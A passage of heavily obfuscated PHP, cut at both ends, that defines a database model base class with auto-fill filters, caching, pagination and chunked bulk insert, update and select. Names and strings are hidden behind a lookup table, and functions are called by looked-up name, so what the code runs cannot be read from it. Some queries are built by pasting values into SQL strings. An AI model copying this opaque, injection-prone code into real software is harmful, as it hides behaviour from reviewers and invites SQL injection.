$_SERVER[£ğ°ÖØø][437]) { $exit = $_SERVER[£ğ°ÖØø][438]; $exit(); } $_act = $_SERVER[£ğ°ÖØø][439]; $_act($_file); } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\163\145\162\164\x2c\x75\160\x64\x61\164\x65", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\143\x72\145\141\164\145\x54\151\155\x65", "\164\151\155\x65", "\x69\156\163\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\156")); public function setDataAuto($š®ğ¹È½) { $this->dataAuto = $š®ğ¹È½; } public function __construct($¥ßé¦–Ä = '', $äïÙÛ¼Ù = '', $©Çâ = '') { parent::__construct($¥ßé¦–Ä, $äïÙÛ¼Ù, $©Çâ); } protected $tableMeta = array(); protected function _beforeInsert(&$µ¿é’œ¤, $‡Èõ„ı±) { $Ü„¬àÚò =& $_SERVER[£ğ°ÖØø]; if (!$this->checkDataAutoHas($Ü„¬àÚò[440])) { return; } $this->dataBeforeFilter($µ¿é’œ¤, $Ü„¬àÚò[440]); } protected function _beforeUpdate(&$ÆşÒÑÑÁ, $¡ÎÙöâÒ) { $ÃÌæÕ›Š =& $_SERVER[£ğ°ÖØø]; if (!$this->checkDataAutoHas($ÃÌæÕ›Š[441])) { return; } $this->dataBeforeFilter($ÆşÒÑÑÁ, $ÃÌæÕ›Š[441]); } protected function _afterSelect(&$ì·®şøÂ, $ÃïÙ¥Õ¯) { if (!is_array($ì·®şøÂ)) { return; } if (!$this->checkDataAutoHas($_SERVER[£ğ°ÖØø][442])) { return; } foreach ($ì·®şøÂ as &$Ó‘Ö“Ğ·) { $this->dataAfterFilter($Ó‘Ö“Ğ·); } unset($Ó‘Ö“Ğ·); } protected function _afterFind(&$è»Ï¸´ƒ, $ÌºİêãÒ) { if (!is_array($è»Ï¸´ƒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[£ğ°ÖØø][442])) { return; } $this->dataAfterFilter($è»Ï¸´ƒ); } public static function textEncode($ˆŠáİ£) { if (!$ˆŠáİ£) { return $ˆŠáİ£; } $œæ°öÏ = json_encode($ˆŠáİ£); $œæ°öÏ = preg_replace_callback($_SERVER[£ğ°ÖØø][443], function ($§Â´Ú£§) { return addslashes($§Â´Ú£§[0]); }, $œæ°öÏ); return json_decode($œæ°öÏ); } public static function textDecode($Ù¶µ½—ˆ) { $“€òÍí­ =& $_SERVER[£ğ°ÖØø]; $‡ßİ¯‰£ = json_encode($Ù¶µ½—ˆ); $‡ßİ¯‰£ = preg_replace_callback($“€òÍí­[444], function ($«º­Ö–û) { return $_SERVER[£ğ°ÖØø][100]; }, $‡ßİ¯‰£); return json_decode($‡ßİ¯‰£); } public function setAutoIncrement($²Êë“‘È) { $İİ¾ùÛµ = array($this->getPk() => $²Êë“‘È); $ÛŒİÑËĞ = $this->data($İİ¾ùÛµ)->add(); if ($ÛŒİÑËĞ) { $this->delete($ÛŒİÑËĞ); } } public function getAutoIncrement() { $Æ·òıÀ¡ = $this->getTableName(); $ÊÙ‡÷¾­ = $this->max($this->getPk()); $ÎÃ†àÄ¸ = $this->query("\163\x68\157\167\40\164\141\142\x6c\x65\40\163\x74\x61\x74\165\163\x20\167\150\x65\162\145\x20\116\x61\155\145\x3d\x27{$Æ·òıÀ¡}\x27"); $şëÚõ´• = $ÎÃ†àÄ¸[0][$_SERVER[£ğ°ÖØø][445]]; $§‹Ùûô = max($ÊÙ‡÷¾­, $şëÚõ´•); return $§‹Ùûô; } protected function _callBefore($Øø×©“¨, $°ÖÌû»Ó) { return $this->cacheCallCheck($Øø×©“¨, $°ÖÌû»Ó, !1); } protected function _callAfter($éÖª±˜¬, $ÜğúšÅ) { return $this->cacheCallCheck($éÖª±˜¬, $ÜğúšÅ, !0); } protected function cacheFunctionAlias($Ãìé´¬) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Êğ‰õöò, $µÊšâÆâ, $Ó¬¸‚õ = false) { $ŸêÒš”œ = $this->cacheFunctionAlias($µÊšâÆâ); if (!$ŸêÒš”œ) { return; } foreach ($ŸêÒš”œ as $Ÿğ¿ÄÉ => $˜®Öíêä) { $‚†´„™ = $˜®Öíêä[0]; $÷ñÀšÅ = explode($_SERVER[£ğ°ÖØø][50], $˜®Öíêä[1]); if ($Êğ‰õöò == $Ÿğ¿ÄÉ) { return $this->cacheFunctionGet($Ÿğ¿ÄÉ, $‚†´„™); } if ($Ó¬¸‚õ && in_array($Êğ‰õöò, $÷ñÀšÅ)) { $this->cacheFunctionClear($Ÿğ¿ÄÉ, $‚†´„™); } } } public function cacheFunctionGet($–Ş«…†à, $´•ÖŸ—Ş) { $‹ôÚØˆ = $this->cacheKeyMake($–Ş«…†à, $´•ÖŸ—Ş); $³–œô² = Cache::get($‹ôÚØˆ); if (!is_array($³–œô²)) { $³–œô² = call_user_func_array(array($this, $–Ş«…†à), array($´•ÖŸ—Ş, !0)); Cache::set($‹ôÚØˆ, $³–œô²); } return $³–œô²; } public function cacheFunctionClear($Œ¢ëù›Î, $Ëê«µÃš) { $øÉ°Æªû = $Ëê«µÃš; if (!is_array($Ëê«µÃš)) { $øÉ°Æªû = array($Ëê«µÃš); } foreach ($øÉ°Æªû as $êúú´¢) { $æ¸€”ùı = $this->cacheKeyMake($Œ¢ëù›Î, $êúú´¢); Cache::remove($æ¸€”ùı); } } private function cacheKeyMake($ŠâïÅ™’, $–¯³¯Ÿ÷) { $‡¸Ù’Œ¬ =& $_SERVER[£ğ°ÖØø]; return get_class($this) . $‡¸Ù’Œ¬[11] . $ŠâïÅ™’ . $‡¸Ù’Œ¬[446] . $–¯³¯Ÿ÷; } protected function selectPageReset() { $íâÕ¹²¬ =& $_SERVER[£ğ°ÖØø]; if (isset($GLOBALS[$íâÕ¹²¬[447]])) { return; } $GLOBALS[$íâÕ¹²¬[447]] = isset($GLOBALS[$íâÕ¹²¬[7]][$íâÕ¹²¬[448]]) ? $GLOBALS[$íâÕ¹²¬[7]][$íâÕ¹²¬[448]] : !1; $GLOBALS[$íâÕ¹²¬[449]] = isset($GLOBALS[$íâÕ¹²¬[7]][$íâÕ¹²¬[429]]) ? $GLOBALS[$íâÕ¹²¬[7]][$íâÕ¹²¬[429]] : !1; $GLOBALS[$íâÕ¹²¬[7]][$íâÕ¹²¬[448]] = !1; $GLOBALS[$íâÕ¹²¬[7]][$íâÕ¹²¬[429]] = !1; } protected function selectPageRestore() { $Ë™úèë­ =& $_SERVER[£ğ°ÖØø]; if (!isset($GLOBALS[$Ë™úèë­[447]])) { return; } $GLOBALS[$Ë™úèë­[7]][$Ë™úèë­[448]] = $GLOBALS[$Ë™úèë­[447]]; $GLOBALS[$Ë™úèë­[7]][$Ë™úèë­[429]] = $GLOBALS[$Ë™úèë­[449]]; if ($GLOBALS[$Ë™úèë­[7]][$Ë™úèë­[448]] === !1) { unset($GLOBALS[$Ë™úèë­[7]][$Ë™úèë­[448]]); } if ($GLOBALS[$Ë™úèë­[7]][$Ë™úèë­[429]] === !1) { unset($GLOBALS[$Ë™úèë­[7]][$Ë™úèë­[429]]); } unset($GLOBALS[$Ë™úèë­[447]]); unset($GLOBALS[$Ë™úèë­[449]]); } protected function selectPage($³ûÍ—Ÿı = 200, $ã½µ¬ıÃ = 1) { $ï˜œ¾û‰ =& $_SERVER[£ğ°ÖØø]; global $in; $Å—…°¹ú = $this->optionsValue(); $ÅçøùÜÇ = 50000; $³ûÍ—Ÿı = isset($in[$ï˜œ¾û‰[448]]) && $in[$ï˜œ¾û‰[448]] ? $in[$ï˜œ¾û‰[448]] : $³ûÍ—Ÿı; if ($³ûÍ—Ÿı === -1) { $in[$ï˜œ¾û‰[448]] = !1; $ÅçøùÜÇ = 100000000; $³ûÍ—Ÿı = $ÅçøùÜÇ; } $ÚŞÔŠøí = $Å—…°¹ú; $ÚŞÔŠøí[$ï˜œ¾û‰[450]] = array(); $³ûÍ—Ÿı = intval($³ûÍ—Ÿı); $³ûÍ—Ÿı = $³ûÍ—Ÿı <= 5 ? 5 : ($³ûÍ—Ÿı >= $ÅçøùÜÇ ? $ÅçøùÜÇ : $³ûÍ—Ÿı); $ã½µ¬ıÃ = intval(isset($in[$ï˜œ¾û‰[429]]) && $in[$ï˜œ¾û‰[429]] ? $in[$ï˜œ¾û‰[429]] : $ã½µ¬ıÃ); $ã½µ¬ıÃ = $ã½µ¬ıÃ <= 1 ? 1 : $ã½µ¬ıÃ; $Í‹µ²áŒ = array(); $‡ ù¡š† = 1; if ($ã½µ¬ıÃ == 1 && $‡ ù¡š†) { $this->optionsValue($Å—…°¹ú); $Í‹µ²áŒ = $this->page($ã½µ¬ıÃ, $³ûÍ—Ÿı)->select(); $’Úú¶’Ò = is_array($Í‹µ²áŒ) ? count($Í‹µ²áŒ) : 0; if ($’Úú¶’Ò < $³ûÍ—Ÿı) { $áëÌäº = 1; } else { $this->optionsValue($ÚŞÔŠøí); $’Úú¶’Ò = intval($this->count()); $áëÌäº = ceil($’Úú¶’Ò / $³ûÍ—Ÿı); } } else { $this->optionsValue($ÚŞÔŠøí); $’Úú¶’Ò = intval($this->count()); $áëÌäº = ceil($’Úú¶’Ò / $³ûÍ—Ÿı); $ã½µ¬ıÃ = $ã½µ¬ıÃ >= $áëÌäº ? $áëÌäº : $ã½µ¬ıÃ; $this->optionsValue($Å—…°¹ú); $Í‹µ²áŒ = $this->page($ã½µ¬ıÃ, $³ûÍ—Ÿı)->select(); } if (!is_array($Í‹µ²áŒ)) { $Í‹µ²áŒ = array(); } if ($áëÌäº == 1) { $’Úú¶’Ò = count($Í‹µ²áŒ); } $‘Âù›á = array($ï˜œ¾û‰[451] => array($ï˜œ¾û‰[452] => $’Úú¶’Ò, $ï˜œ¾û‰[448] => $³ûÍ—Ÿı, $ï˜œ¾û‰[429] => $ã½µ¬ıÃ, $ï˜œ¾û‰[453] => $áëÌäº), $ï˜œ¾û‰[454] => $Í‹µ²áŒ); return $‘Âù›á; } protected function checkLength($ã‚¼ŞÌ, $Å¤¡µ Ï = 0, $ˆ¦€á€€ = '') { $‡ ãÙ—½ =& $_SERVER[£ğ°ÖØø]; $Å¤¡µ Ï = $Å¤¡µ Ï ? $Å¤¡µ Ï : 65536; if (!$ã‚¼ŞÌ || strlen($ã‚¼ŞÌ) < $Å¤¡µ Ï) { return; } $ˆ¦€á€€ = $ˆ¦€á€€ ? $ˆ¦€á€€ . $‡ ãÙ—½[74] : $‡ ãÙ—½[12]; show_json($ˆ¦€á€€ . LNG($‡ ãÙ—½[455]) . "\x28{$Å¤¡µ Ï}\x29", !1); } protected function metaSet($Âİšó¨’, $µ€¡Øîø = null, $¾ÅÂ„ = null) { $Û‰ÕÀáÌ =& $_SERVER[£ğ°ÖØø]; if (!$this->tableMeta || !$Âİšó¨’) { return !1; } $ªÁ¾™‹û = $this->tableMeta[$Û‰ÕÀáÌ[456]]; $«ƒòïØ¾ = $this->tableMeta[$Û‰ÕÀáÌ[457]]; $š£½Õ¥Ö = Model($«ƒòïØ¾); $Ã«÷“ôÄ = array($ªÁ¾™‹û => $Âİšó¨’, $Û‰ÕÀáÌ[458] => $µ€¡Øîø); if (is_null($µ€¡Øîø)) { return $š£½Õ¥Ö->where(array($ªÁ¾™‹û => $Âİšó¨’))->delete(); } if (is_null($¾ÅÂ„) && is_string($µ€¡Øîø)) { return $š£½Õ¥Ö->where($Ã«÷“ôÄ)->delete(); } $§Ã‘­¼³ = is_array($µ€¡Øîø) ? $µ€¡Øîø : array(); if (is_string($µ€¡Øîø)) { $§Ã‘­¼³[$µ€¡Øîø] = $¾ÅÂ„; } $‰«çğì‹ = array(); foreach ($§Ã‘­¼³ as $®Ï¬„¬‡ => $–ÂõËâî) { if (is_null($–ÂõËâî) && is_string($®Ï¬„¬‡)) { $š£½Õ¥Ö->where(array($ªÁ¾™‹û => $Âİšó¨’, $Û‰ÕÀáÌ[458] => $®Ï¬„¬‡))->delete(); continue; } $this->checkLength($–ÂõËâî, !1, $«ƒòïØ¾ . $Û‰ÕÀáÌ[4] . $®Ï¬„¬‡); $‰«çğì‹[] = array($ªÁ¾™‹û => $Âİšó¨’, $Û‰ÕÀáÌ[97] => $®Ï¬„¬‡, $Û‰ÕÀáÌ[459] => $–ÂõËâî); } $ıÄ¹±¡Œ = $Û‰ÕÀáÌ[460] . $«ƒòïØ¾; CacheLock::lock($ıÄ¹±¡Œ); $š£½Õ¥Ö->where(array($ªÁ¾™‹û => $Âİšó¨’))->addAll($‰«çğì‹, array(), !0); CacheLock::unlock($ıÄ¹±¡Œ); return !0; } public function metaGet($¿®Å¡ëË, $Üàœ¬Å× = false) { $’ûÑ©¼© =& $_SERVER[£ğ°ÖØø]; if (!$this->tableMeta) { return array(); } $åÀÊ† = $this->tableMeta[$’ûÑ©¼©[456]]; $ïï½œµ¢ = Model($this->tableMeta[$’ûÑ©¼©[457]]); if ($Üàœ¬Å×) { $ÆÒ÷««Ô = array($åÀÊ† => $¿®Å¡ëË, $’ûÑ©¼©[97] => $Üàœ¬Å×); return $ïï½œµ¢->where($ÆÒ÷««Ô)->getField($’ûÑ©¼©[459]); } $ÆÒ÷««Ô = array($åÀÊ† => $¿®Å¡ëË); $°”ß‡ñÓ = $ïï½œµ¢->field($’ûÑ©¼©[461])->where($ÆÒ÷««Ô)->select(); $°”ß‡ñÓ = array_to_keyvalue($°”ß‡ñÓ, $’ûÑ©¼©[97], $’ûÑ©¼©[459]); return $°”ß‡ñÓ; } private function checkDataAutoHas($ç‹îÜº) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $›ô·¤°‰) { if (in_array($ç‹îÜº, explode($_SERVER[£ğ°ÖØø][50], $›ô·¤°‰[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$êÑä‡¤ê, $¿ƒ”†Ö–) { $ïêª¨‰ˆ =& $_SERVER[£ğ°ÖØø]; if (!is_array($êÑä‡¤ê)) { return; } foreach ($this->dataAuto as $’œ™“) { $„–ÖÏ¯¦ = $’œ™“[0]; if (!in_array($¿ƒ”†Ö–, explode($ïêª¨‰ˆ[50], $’œ™“[2]))) { continue; } switch (trim($’œ™“[3])) { case $ïêª¨‰ˆ[397]: case $ïêª¨‰ˆ[398]: $¿Ìü†è„ = $’œ™“[1]; $áÑË°’Á = isset($’œ™“[4]) ? (array) $’œ™“[4] : array(); if ($¿Ìü†è„ == $ïêª¨‰ˆ[206] && array_key_exists($„–ÖÏ¯¦, $êÑä‡¤ê)) { if (!$êÑä‡¤ê[$„–ÖÏ¯¦]) { unset($êÑä‡¤ê[$„–ÖÏ¯¦]); } break; } if (isset($êÑä‡¤ê[$„–ÖÏ¯¦])) { array_unshift($áÑË°’Á, $êÑä‡¤ê[$„–ÖÏ¯¦]); } if ($ïêª¨‰ˆ[397] == $’œ™“[3]) { $êÑä‡¤ê[$„–ÖÏ¯¦] = call_user_func_array($¿Ìü†è„, $áÑË°’Á); } else { $êÑä‡¤ê[$„–ÖÏ¯¦] = call_user_func_array(array(&$this, $¿Ìü†è„), $áÑË°’Á); } break; case $ïêª¨‰ˆ[347]: if (isset($êÑä‡¤ê[$„–ÖÏ¯¦]) && $êÑä‡¤ê[$„–ÖÏ¯¦]) { $êÑä‡¤ê[$„–ÖÏ¯¦] = call_user_func_array(array(&$this, $’œ™“[1]), array($êÑä‡¤ê[$„–ÖÏ¯¦])); } break; case $ïêª¨‰ˆ[350]: $êÑä‡¤ê[$„–ÖÏ¯¦] = $êÑä‡¤ê[$’œ™“[1]]; break; case $ïêª¨‰ˆ[370]: if (isset($êÑä‡¤ê[$„–ÖÏ¯¦]) && !is_string($êÑä‡¤ê[$„–ÖÏ¯¦])) { $êÑä‡¤ê[$„–ÖÏ¯¦] = json_encode_force($êÑä‡¤ê[$„–ÖÏ¯¦]); } break; case $ïêª¨‰ˆ[399]: if ($êÑä‡¤ê[$„–ÖÏ¯¦] === $ïêª¨‰ˆ[12]) { unset($êÑä‡¤ê[$„–ÖÏ¯¦]); } break; case $ïêª¨‰ˆ[400]: $êÑä‡¤ê[$„–ÖÏ¯¦] = $’œ™“[1]; default: break; } } if ($¿ƒ”†Ö– == $ïêª¨‰ˆ[440]) { $ûÆ»Ô´Ç = strtolower($this->db->getDbType()); if (strpos($ûÆ»Ô´Ç, $ïêª¨‰ˆ[13]) !== 0) { return; } $™ûèÅ = $this->field(!0)->fields; $Å¡³ª Œ = $™ûèÅ[$ïêª¨‰ˆ[329]]; if (isset($™ûèÅ[$ïêª¨‰ˆ[328]])) { unset($Å¡³ª Œ[$™ûèÅ[$ïêª¨‰ˆ[328]]]); } foreach ($Å¡³ª Œ as $´³œö³İ => $¿ƒ”†Ö–) { if (!isset($êÑä‡¤ê[$´³œö³İ])) { $êÑä‡¤ê[$´³œö³İ] = $ïêª¨‰ˆ[12]; } } } } private function dataAfterFilter(&$Ê§†»©‰) { $ûò­´ÜÄ =& $_SERVER[£ğ°ÖØø]; foreach ($this->dataAuto as $ßùËõ¹ê) { $ñûù = $ßùËõ¹ê[0]; if (!isset($Ê§†»©‰[$ñûù])) { continue; } if (!in_array($ûò­´ÜÄ[442], explode($ûò­´ÜÄ[50], $ßùËõ¹ê[2]))) { continue; } switch (trim($ßùËõ¹ê[3])) { case $ûò­´ÜÄ[397]: case $ûò­´ÜÄ[398]: $øîÃÛ« = isset($ßùËõ¹ê[4]) ? (array) $ßùËõ¹ê[4] : array(); array_unshift($øîÃÛ«, $Ê§†»©‰[$ñûù]); if (isset($ßùËõ¹ê[4]) && $ßùËõ¹ê[4] == $ûò­´ÜÄ[462]) { $øîÃÛ« = array($Ê§†»©‰[$ñûù]); } if ($ûò­´ÜÄ[397] == $ßùËõ¹ê[3]) { $Ê§†»©‰[$ñûù] = call_user_func_array($ßùËõ¹ê[1], $øîÃÛ«); } else { $Ê§†»©‰[$ñûù] = call_user_func_array(array(&$this, $ßùËõ¹ê[1]), $øîÃÛ«); } break; case $ûò­´ÜÄ[347]: if (isset($Ê§†»©‰[$ñûù]) && $Ê§†»©‰[$ñûù]) { $Ê§†»©‰[$ñûù] = call_user_func_array(array(&$this, $ßùËõ¹ê[1]), array($Ê§†»©‰[$ñûù])); } break; case $ûò­´ÜÄ[350]: $Ê§†»©‰[$ñûù] = $Ê§†»©‰[$ßùËõ¹ê[1]]; break; case $ûò­´ÜÄ[370]: $İ®»è² = $Ê§†»©‰[$ñûù]; $Ê§†»©‰[$ñûù] = json_decode($İ®»è², !0); if (is_null($Ê§†»©‰[$ñûù])) { $Ê§†»©‰[$ñûù] = $İ®»è²; } break; case $ûò­´ÜÄ[399]: if ($Ê§†»©‰[$ñûù] === $ûò­´ÜÄ[12]) { unset($Ê§†»©‰[$ñûù]); } break; case $ûò­´ÜÄ[400]: $Ê§†»©‰[$ñûù] = $ßùËõ¹ê[1]; break; default: break; } } } public function saveAll($Îå£óšª) { $”™–·Ú =& $_SERVER[£ğ°ÖØø]; $ŒÆ¿ı¨ß = $this->tablePrefix . $this->tableName; $³¾ş¼İ‘ = self::SQL_WHERE_IN_CHUNK; $Îå£óšª = is_array($Îå£óšª) ? $Îå£óšª : array(); $ÛöÃÂ¬Í = $”™–·Ú[463]; $İìŒúÂ = 0; $Ãşüô‹ = array(); $æ½‡Æ²æ = count($Îå£óšª); for ($Ì‰Ì³È = 0; $Ì‰Ì³È < $æ½‡Æ²æ; $Ì‰Ì³È++) { $üëø®û¤ = $Îå£óšª[$Ì‰Ì³È]; if (!is_array($üëø®û¤) || count($üëø®û¤) != 4) { continue; } $ ˜ô†² = "\125\120\104\x41\124\x45\x20\140{$ŒÆ¿ı¨ß}\140\x20\x53\105\124\40{$üëø®û¤[2]}\x20\75\x20\103\x41\123\105\40{$üëø®û¤[0]}\40\xa"; if ($İìŒúÂ == 0) { $ÛöÃÂ¬Í = $ ˜ô†²; } $Ãşüô‹[] = $”™–·Ú[121] . $üëø®û¤[1] . $”™–·Ú[121]; $İìŒúÂ++; $ÛöÃÂ¬Í .= "\40\x57\110\105\x4e\40\x27{$üëø®û¤[1]}\47\40\x54\110\x45\116\40\x27{$üëø®û¤[3]}\47\40\xa"; if ($İìŒúÂ == $³¾ş¼İ‘ || $Ì‰Ì³È == $æ½‡Æ²æ - 1) { $µ‡ş“üç = implode($”™–·Ú[50], $Ãşüô‹); $ÛöÃÂ¬Í .= "\x20\x45\116\104\40\40\127\x48\105\x52\105\x20{$üëø®û¤[0]}\x20\x49\x4e\40\x28{$µ‡ş“üç}\51\x20"; $this->execute($ÛöÃÂ¬Í); $İìŒúÂ = 0; $ÛöÃÂ¬Í = $ ˜ô†²; $this->chunkEventCheck(count($Ãşüô‹)); $Ãşüô‹ = array(); } } $this->chunkEventSet(); } public function saveAllEach($î•õü—Ó) { $‘³á–ÍÈ =& $_SERVER[£ğ°ÖØø]; $óôÅÔˆ“ = $this->tablePrefix . $this->tableName; foreach ($î•õü—Ó as $†â †çÕ) { if (!is_array($†â †çÕ) || count($†â †çÕ) != 4) { continue; } $ÓÏõœ¯£ = $†â †çÕ[0] . $‘³á–ÍÈ[464] . $†â †çÕ[1] . $‘³á–ÍÈ[121]; $¦’¦ÃŞ– = $†â †çÕ[2] . $‘³á–ÍÈ[464] . $†â †çÕ[3] . $‘³á–ÍÈ[121]; $ç×€× ¼ = "\x75\x70\x64\141\x74\145\40{$óôÅÔˆ“}\40\163\x65\164\40{$¦’¦ÃŞ–}\40\x77\150\145\162\145\40{$ÓÏõœ¯£}\x3b"; $this->execute($ç×€× ¼); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ï”¬Ñ ê = false, $¥ø†Ò¾» = false) { $this->_chunkEvent = $Ï”¬Ñ ê; $this->_chunkEventParam = $¥ø†Ò¾»; } private function chunkEventCheck($÷·›½Ñ) { if (!$this->_chunkEvent) { return; } $©îüàñÚ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $©îüàñÚ[$_SERVER[£ğ°ÖØø][465]] = $÷·›½Ñ; Hook::trigger($this->_chunkEvent, $©îüàñÚ); } public function addAll($ª´óö¤™, $±ä©ªŒ© = array(), $ÎÚüÜâº = false) { $‚üÌÒ®é =& $_SERVER[£ğ°ÖØø]; ignore_timeout(); $ßÈüšŞ¯ = self::SQL_WHERE_IN_CHUNK; if (empty($ª´óö¤™)) { $this->error = think_lang($‚üÌÒ®é[348]); return !1; } $±ä©ªŒ© = $this->_parseOptions($±ä©ªŒ©); foreach ($ª´óö¤™ as $¨…¸øÕ÷ => $•õá»ÇÁ) { $ª´óö¤™[$¨…¸øÕ÷] = $this->_facade($•õá»ÇÁ); $this->_beforeInsert($ª´óö¤™[$¨…¸øÕ÷], $±ä©ªŒ©); } if (method_exists($this->db, $‚üÌÒ®é[349])) { for ($Öıæ—ùö = 0; $Öıæ—ùö < count($ª´óö¤™); $Öıæ—ùö += $ßÈüšŞ¯) { $ïÄ½©˜° = array_slice($ª´óö¤™, $Öıæ—ùö, $ßÈüšŞ¯); if (!is_array($ïÄ½©˜°) || count($ïÄ½©˜°) == 0) { break; } $¡ò™³©ò = $this->db->insertAll($ïÄ½©˜°, $±ä©ªŒ©, $ÎÚüÜâº); $this->chunkEventCheck(count($ïÄ½©˜°)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ª´óö¤™ as $¨…¸øÕ÷ => $•õá»ÇÁ) { $¡ò™³©ò = $this->db->insert($•õá»ÇÁ, $±ä©ªŒ©, $ÎÚüÜâº); } $this->commit(); } if (!1 !== $¡ò™³©ò) { $œÜ½î˜ = $this->getLastInsID(); if ($œÜ½î˜) { return $œÜ½î˜; } } return $¡ò™³©ò; } public function save($…‚…ŠĞı = '', $şû‘Âô„ = array()) { $÷í½şÎÃ =& $_SERVER[£ğ°ÖØø]; $±Ë’â»È = self::SQL_WHERE_IN_CHUNK; $‚¡òÓí = $this->optionsValue(); $­ü©¥™Ù = $this->findWhereField($‚¡òÓí); if (!$­ü©¥™Ù) { return parent::save($…‚…ŠĞı, $şû‘Âô„); } $•Á×ÔÛ• = 0; $ƒï¯Ë®ô = $‚¡òÓí[$÷í½şÎÃ[352]][$­ü©¥™Ù][1]; $ƒï¯Ë®ô = is_array($ƒï¯Ë®ô) ? $ƒï¯Ë®ô : array(); $š»ÓŒºÒ = count($ƒï¯Ë®ô); for ($æÚÂó‡ = 0; $æÚÂó‡ < $š»ÓŒºÒ; $æÚÂó‡ += $±Ë’â»È) { $‰û÷¦êŠ = array_slice($ƒï¯Ë®ô, $æÚÂó‡, $±Ë’â»È); if (!is_array($‰û÷¦êŠ) || count($‰û÷¦êŠ) == 0) { break; } $‚¡òÓí[$÷í½şÎÃ[352]][$­ü©¥™Ù][1] = $‰û÷¦êŠ; $this->optionsValue($‚¡òÓí); $•Á×ÔÛ• += parent::save($…‚…ŠĞı, $şû‘Âô„); $this->chunkEventCheck(count($‰û÷¦êŠ)); } $this->chunkEventSet(); return $•Á×ÔÛ•; } public function add($Ï°’÷ş± = '', $¾û¼Ğœ¿ = array(), $»ê”ĞÈ¬ = false) { if ($this->addTaskStatus && is_array($Ï°’÷ş±)) { $this->addTaskData[] = $Ï°’÷ş±; return; } return parent::add($Ï°’÷ş±, $¾û¼Ğœ¿, $»ê”ĞÈ¬); } public function parseWhereLike($İŒÙÈ¹û, $´ŸöÁ÷² = '', $‹öÜ‡ã¶ = false, &$¦·¨Ú‘¨ = false) { $ïªã’¾Ú =& $_SERVER[£ğ°ÖØø]; $—öÅŸø§ = $GLOBALS[$ïªã’¾Ú[6]][$ïªã’¾Ú[466]]; if (!$—öÅŸø§[$ïªã’¾Ú[467]]) { return $İŒÙÈ¹û; } if (!is_array($İŒÙÈ¹û)) { return $İŒÙÈ¹û; } $Ó•ˆ‹ØÃ = array(); $ÓÁ£×‰— = 0; foreach ($İŒÙÈ¹û as $¢œ±š¯Î => $¦œªîÃ ) { if (is_array($¦œªîÃ ) && count($¦œªîÃ ) == 2 && $¦œªîÃ [0] == $ïªã’¾Ú[468] && is_string($¦œªîÃ [1]) && substr($¦œªîÃ [1], 0, 1) == $ïªã’¾Ú[469] && substr($¦œªîÃ [1], strlen($¦œªîÃ [1]) - 1, 1) == $ïªã’¾Ú[469]) { $¦·¨Ú‘¨ = !0; $÷ïÄ°¡í = is_string($¢œ±š¯Î) ? $¢œ±š¯Î : $´ŸöÁ÷²; $›À‰Ç = substr($¦œªîÃ [1], 1, strlen($¦œªîÃ [1]) - 2); $›À‰Ç = $this->db->escapeString($›À‰Ç); if (!strpos($÷ïÄ°¡í, $ïªã’¾Ú[10])) { $÷ïÄ°¡í = $ïªã’¾Ú[470] . $÷ïÄ°¡í . $ïªã’¾Ú[470]; } $­±ü‰¦¥ = $ïªã’¾Ú[220] . $›À‰Ç . $ïªã’¾Ú[220]; $›À‰Ç = str_replace(array($ïªã’¾Ú[10], $ïªã’¾Ú[471], $ïªã’¾Ú[11]), $ïªã’¾Ú[472], $›À‰Ç); if ($—öÅŸø§[$ïªã’¾Ú[473]]) { $­±ü‰¦¥ = $ïªã’¾Ú[474] . $›À‰Ç . $ïªã’¾Ú[475]; if ($—öÅŸø§[$ïªã’¾Ú[476]]) { $­±ü‰¦¥ = $ïªã’¾Ú[475] . $›À‰Ç . $ïªã’¾Ú[474]; } } $Ó•ˆ‹ØÃ[$ÓÁ£×‰—] = $ïªã’¾Ú[477] . $÷ïÄ°¡í . $ïªã’¾Ú[478] . $­±ü‰¦¥ . $ïªã’¾Ú[479]; $ÓÁ£×‰—++; continue; } if (is_array($¦œªîÃ )) { $´ŸöÁ÷² = is_string($¢œ±š¯Î) ? $¢œ±š¯Î : $´ŸöÁ÷²; $¦œªîÃ  = $this->parseWhereLike($¦œªîÃ , $´ŸöÁ÷², !0, $¦·¨Ú‘¨); } if (is_numeric($¢œ±š¯Î)) { $Ó•ˆ‹ØÃ[$ÓÁ£×‰—] = $¦œªîÃ ; $ÓÁ£×‰—++; } else { $Ó•ˆ‹ØÃ[$¢œ±š¯Î] = $¦œªîÃ ; } } if ($¦·¨Ú‘¨ && !$‹öÜ‡ã¶) { } return $Ó•ˆ‹ØÃ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($È—Ü¤Öˆ = array()) { $¹·ØÖŒÇ =& $_SERVER[£ğ°ÖØø]; $ Ï¾ìµ¨ = self::SQL_WHERE_IN_CHUNK; $ìƒß ìĞ = $this->optionsValue(); $˜ÏÜã† = $this->findWhereField($ìƒß ìĞ); if (!$˜ÏÜã† || isset($ìƒß ìĞ[$¹·ØÖŒÇ[368]]) || isset($ìƒß ìĞ[$¹·ØÖŒÇ[429]])) { return parent::select($È—Ü¤Öˆ); } $Á¬€ì± = $ìƒß ìĞ[$¹·ØÖŒÇ[352]][$˜ÏÜã†][1]; $Á¬€ì± = is_array($Á¬€ì±) ? $Á¬€ì± : array(); $ºÕÓøÆ‹ = null; for ($ĞÉ™–² = 0; $ĞÉ™–² < count($Á¬€ì±); $ĞÉ™–² += $ Ï¾ìµ¨) { $ÆŞ†€Òá = array_slice($Á¬€ì±, $ĞÉ™–², $ Ï¾ìµ¨); if (!is_array($ÆŞ†€Òá) || count($ÆŞ†€Òá) == 0) { break; } $ìƒß ìĞ[$¹·ØÖŒÇ[352]][$˜ÏÜã†][1] = $ÆŞ†€Òá; $this->optionsValue($ìƒß ìĞ); $ê¤¡ñÍË = parent::select($È—Ü¤Öˆ); if 